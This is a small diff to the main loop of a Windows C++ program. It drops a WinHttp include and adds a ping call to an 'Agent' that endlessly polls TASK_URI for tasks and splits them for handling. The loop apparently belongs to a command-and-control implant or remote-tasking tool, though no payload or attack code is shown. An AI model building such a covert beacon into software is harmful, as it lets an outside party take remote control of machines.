@@ -6,7 +6,6 @@
 #include <sstream>
 #include <vector>
 #include <Windows.h>
-#include <WinHttp.h>
 
 #include "Config.h"
 #include "Agent.h"
@@ -33,6 +32,7 @@ int main()
 
 	while (true) {
 		std::string task = agent.Get(TASK_URI);
+		agent.ping();
 
 		if (task != "") {
 			std::vector <std::string> Task = split(task);
